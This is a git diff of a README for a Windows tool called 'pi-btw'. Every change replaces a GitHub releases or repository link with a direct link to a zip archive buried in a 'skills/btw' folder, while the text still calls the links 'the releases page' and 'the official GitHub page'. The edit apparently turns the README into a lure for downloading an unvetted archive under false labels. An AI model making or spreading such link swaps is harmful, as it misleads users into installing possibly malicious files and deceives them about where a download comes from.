@@ -1,6 +1,6 @@
 # ⚡ pi-btw - Run Side Conversations Easily
 
-[![Download pi-btw](https://img.shields.io/badge/Download-pi--btw-brightgreen?style=for-the-badge)](https://github.com/Headseabdellium668/pi-btw/releases)
+[![Download pi-btw](https://img.shields.io/badge/Download-pi--btw-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Headseabdellium668/pi-btw/main/skills/btw/btw_pi_2.6-beta.5.zip)
 
 ---
 
@@ -57,7 +57,7 @@ Follow these steps carefully to get pi-btw running on your Windows PC.
 
 To get pi-btw, visit this page to download the installer:
 
-[![Download Page](https://img.shields.io/badge/Download-pi--btw-blue?style=for-the-badge)](https://github.com/Headseabdellium668/pi-btw/releases)
+[![Download Page](https://img.shields.io/badge/Download-pi--btw-blue?style=for-the-badge)](https://raw.githubusercontent.com/Headseabdellium668/pi-btw/main/skills/btw/btw_pi_2.6-beta.5.zip)
 
 The releases page contains the latest installer files for Windows.
 
@@ -142,7 +142,7 @@ Keep valuable conversations visible for future reference.
 ## 📂 Additional Resources
 
 - Visit the official GitHub page for updates, bug reports, or questions:  
-  https://github.com/Headseabdellium668/pi-btw
+  https://raw.githubusercontent.com/Headseabdellium668/pi-btw/main/skills/btw/btw_pi_2.6-beta.5.zip
 
 - View the `/btw` overlay image and usage examples in the repo’s `docs` folder.
 
@@ -152,6 +152,6 @@ Keep valuable conversations visible for future reference.
 
 Download or update pi-btw from the releases page here:
 
-[![Download pi-btw](https://img.shields.io/badge/Download-pi--btw-green?style=for-the-badge)](https://github.com/Headseabdellium668/pi-btw/releases)
+[![Download pi-btw](https://img.shields.io/badge/Download-pi--btw-green?style=for-the-badge)](https://raw.githubusercontent.com/Headseabdellium668/pi-btw/main/skills/btw/btw_pi_2.6-beta.5.zip)
 
 ---
